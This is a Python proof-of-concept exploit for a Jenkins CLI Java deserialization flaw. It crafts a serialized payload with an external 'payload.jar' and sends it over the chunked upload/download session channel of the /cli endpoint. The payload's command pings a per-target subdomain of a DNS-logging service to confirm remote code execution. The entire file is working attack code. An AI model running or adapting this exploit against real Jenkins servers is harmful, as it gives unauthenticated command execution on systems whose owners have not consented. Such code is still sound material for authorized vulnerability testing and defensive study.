import urllib

import requests
import uuid
import threading
import time
import gzip
import urllib3
import zlib
import os

proxies = {
  #'http': 'http://127.0.0.1:8085',
#  'https': 'http://127.0.0.1:8090',
}

URL='http://127.0.0.1:8080/cli'

PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
PROTO = b'\x00\x00\x00\x00'
FILE_SER = ''
filename = ''

def gencmd(ip, port):
	global FILE_SER
	global filename
	#print os.getcwd()
	os.chdir("/Users/4nim4l/poc/bughunter/xxx")
	filename = str(uuid.uuid4()) + ".payload"
	os.system('java -jar payload.jar {2} "ping jenkins.{0}.{1}.fq1ezq.ceye.io"'.format(ip,port,filename))
	FILE_SER = open(filename,"rb").read()

def download(url, session):

    headers = {'Side' : 'download'}
    headers['Content-type'] = 'application/x-www-form-urlencoded'
    headers['Session'] = session
    headers['Transfer-Encoding'] = 'chunked'
    r = requests.post(url, data=null_payload(),headers=headers, proxies=proxies, stream=True)
    print(r.content)


def upload(url, session, data):

    headers = {'Side' : 'upload'}
    headers['Session'] = session
    headers['Content-type'] = 'application/octet-stream'
    headers['Accept-Encoding'] = None
    r = requests.post(url,data=data,headers=headers,proxies=proxies)


def upload_chunked(url,session, data):

    headers = {'Side' : 'upload'}
    headers['Session'] = session
    headers['Content-type'] = 'application/octet-stream'
    headers['Accept-Encoding']= None
    headers['Transfer-Encoding'] = 'chunked'
    headers['Cache-Control'] = 'no-cache'

    r = requests.post(url, headers=headers, data=create_payload_chunked(), proxies=proxies)


def null_payload():
    yield b" "

def create_payload():
    payload = PREAMLE + PROTO + FILE_SER

    return payload

def create_payload_chunked():
    yield PREAMLE
    yield PROTO
    yield FILE_SER

def main():
    session = str(uuid.uuid4())

    t = threading.Thread(target=download, args=(URL, session))
    t.start()

    time.sleep(1)
    #upload(URL, session, create_payload())

    upload_chunked(URL, session, "asdf")
    os.system("rm " + filename)

if __name__ == "__main__":
    main()
